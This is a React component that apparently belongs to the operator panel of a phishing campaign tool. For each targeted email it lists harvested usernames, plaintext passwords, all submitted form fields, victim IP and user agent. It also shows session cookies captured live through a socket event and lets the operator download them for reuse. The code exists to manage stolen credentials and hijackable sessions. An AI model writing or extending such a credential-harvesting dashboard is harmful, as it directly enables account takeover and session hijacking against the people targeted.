import React, { useState, useEffect } from 'react';
import { fetchLoginAttempts, downloadCookies } from '../../services/apiService';
import socketService from '../../services/socketService';
import config from '../../config/apiConfig';

const LoginAttemptsList = ({ campaignId }) => {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [expandedIds, setExpandedIds] = useState({});

  const { addEventListener } = socketService;

  // Fetch login attempts every 10 seconds
  useEffect(() => {
    if (!campaignId) return;

    let isMounted = true;
    const fetchData = async () => {
      try {
        setLoading(true);
        const response = await fetchLoginAttempts(campaignId);
        if (!isMounted) return;
        setLoginAttempts(response.loginAttempts || []);
        setError(null);
      } catch (err) {
        console.error('Error fetching login attempts:', err);
        if (!isMounted) return;
        setError(err.response?.data?.message || 'Failed to load login attempts');
      } finally {
        if (isMounted) setLoading(false);
      }
    };

    fetchData();
    const interval = setInterval(fetchData, 10000);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [campaignId]);

  // Listen for cookies:captured and patch state
  useEffect(() => {
    const handleCookies = (data) => {
      console.log('► handleCookies payload:', data);

      // Determine which field your backend emitted
      const attemptId = data.attemptId ?? data.id ?? data.attempt_id;
      const cookies = Array.isArray(data.cookies) ? data.cookies : [];

      setLoginAttempts(prev =>
        prev.map(attempt =>
          attempt.id === attemptId
            ? {
                ...attempt,
                hasCookies: true,
                cookies,
                cookiesCount: cookies.length
              }
            : attempt
        )
      );
    };

    const unsubscribe = addEventListener('cookies:captured', handleCookies);
    return () => unsubscribe();
  }, [addEventListener]);

  const formatDate = timestamp => new Date(timestamp).toLocaleString();

  const handleDownloadCookies = attemptId => {
    try {
      downloadCookies(attemptId);
    } catch (err) {
      console.error('Error downloading cookies:', err);
      alert('Failed to download cookies. Please try again.');
    }
  };

  const toggleExpand = id =>
    setExpandedIds(prev => ({ ...prev, [id]: !prev[id] }));

  // — Rendering states —
  if (loading && !loginAttempts.length) {
    return (
      <div className="bg-white rounded-lg shadow p-6 my-4">
        <h2 className="text-xl font-bold mb-4">Login Attempts</h2>
        <div className="flex justify-center">
          <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500"></div>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="bg-white rounded-lg shadow p-6 my-4">
        <h2 className="text-xl font-bold mb-4">Login Attempts</h2>
        <p className="text-red-500">{error}</p>
      </div>
    );
  }

  if (!loginAttempts.length) {
    return (
      <div className="bg-white rounded-lg shadow p-6 my-4">
        <h2 className="text-xl font-bold mb-4">Login Attempts</h2>
        <p className="text-gray-500">No login attempts recorded for this campaign.</p>
      </div>
    );
  }

  // — Main list —
  return (
    <div className="bg-white rounded-lg shadow p-6 my-4">
      <h2 className="text-xl font-bold mb-4">
        Login Attempts ({loginAttempts.length})
      </h2>

      <div className="space-y-6">
        {loginAttempts.map(attempt => (
          <div key={attempt.id} className="border rounded-lg p-4 bg-gray-50">
            {/* Header */}
            <div className="flex justify-between">
              <h3 className="font-semibold">{attempt.targetEmail}</h3>
              <span className="text-sm text-gray-500">{formatDate(attempt.timestamp)}</span>
            </div>

            <div className="mt-3 grid md:grid-cols-2 gap-4">
              {/* Credentials/Form Fields */}
              <div>
                <h4 className="font-semibold text-sm">Credentials Used</h4>
                <div className="bg-white p-3 rounded border mt-1">
                  {attempt.username || attempt.password || attempt.inputEmail ? (
                    <>
                      {attempt.username && <div>Username: {attempt.username}</div>}
                      {attempt.password && <div>Password: {attempt.password}</div>}
                      {attempt.inputEmail && <div>Email: {attempt.inputEmail}</div>}
                    </>
                  ) : (
                    <em>No credentials captured</em>
                  )}
                </div>

                {attempt.formFields?.length > 0 && (
                  <div className="mt-3">
                    <button
                      onClick={() => toggleExpand(`form-${attempt.id}`)}
                      className="text-blue-500 text-xs"
                    >
                      {expandedIds[`form-${attempt.id}`] ? 'Hide' : 'Show'} All Form Fields
                    </button>
                    {expandedIds[`form-${attempt.id}`] && (
                      <div className="mt-2 max-h-60 overflow-auto border rounded p-2">
                        <table className="w-full text-sm">
                          <thead>
                            <tr>
                              <th className="text-left">Field</th>
                              <th className="text-left">Value</th>
                            </tr>
                          </thead>
                          <tbody>
                            {attempt.formFields.map((f, i) => (
                              <tr key={i}>
                                <td>{f.name}</td>
                                <td>{typeof f.value === 'object' ? JSON.stringify(f.value) : f.value}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Cookies Panel */}
              <div>
                <h4 className="font-semibold text-sm">Cookies</h4>
                <div className="bg-white p-3 rounded border mt-1">
                  {attempt.hasCookies ? (
                    <>
                      <div>{attempt.cookiesCount} cookies captured</div>
                      <div className="mt-2 flex space-x-2">
                        <button
                          onClick={() => handleDownloadCookies(attempt.id)}
                          className="px-2 py-1 bg-blue-500 text-white rounded"
                        >
                          Download
                        </button>
                        <button
                          onClick={() => toggleExpand(`cookies-${attempt.id}`)}
                          className="px-2 py-1 bg-gray-500 text-white rounded"
                        >
                          {expandedIds[`cookies-${attempt.id}`] ? 'Hide' : 'View'}
                        </button>
                      </div>
                      {expandedIds[`cookies-${attempt.id}`] && (
                        <div className="mt-2 max-h-60 overflow-auto border rounded p-2 text-sm">
                          <table className="w-full">
                            <thead>
                              <tr>
                                <th>Name</th>
                                <th>Value</th>
                                <th>Domain</th>
                                <th>Path</th>
                                <th>Expires</th>
                                <th>Flags</th>
                              </tr>
                            </thead>
                            <tbody>
                              {attempt.cookies.map((c, i) => (
                                <tr key={i}>
                                  <td>{c.name}</td>
                                  <td className="break-all">{c.value}</td>
                                  <td>{c.domain || '—'}</td>
                                  <td>{c.path || '/'}</td>
                                  <td>{c.expirationDate ? new Date(c.expirationDate*1000).toLocaleString() : 'Session'}</td>
                                  <td>{[
                                    c.httpOnly && 'HttpOnly',
                                    c.secure && 'Secure',
                                    c.hostOnly && 'HostOnly',
                                    c.session && 'Session',
                                    c.sameSite && `SameSite=${c.sameSite}`
                                  ].filter(Boolean).join(', ')}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      )}
                    </>
                  ) : (
                    <em>No cookies captured</em>
                  )}
                </div>
              </div>
            </div>

            {/* Additional Info */}
            <div className="mt-4 text-sm">
              <div>Target Email: {attempt.targetEmail}</div>
              <div>URL: {attempt.url}</div>
              <div>IP: {attempt.ipAddress || 'N/A'}</div>
              <div>User Agent: {attempt.userAgent || 'N/A'}</div>
              {attempt.captureMethod && <div>Method: {attempt.captureMethod}</div>}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default LoginAttemptsList;
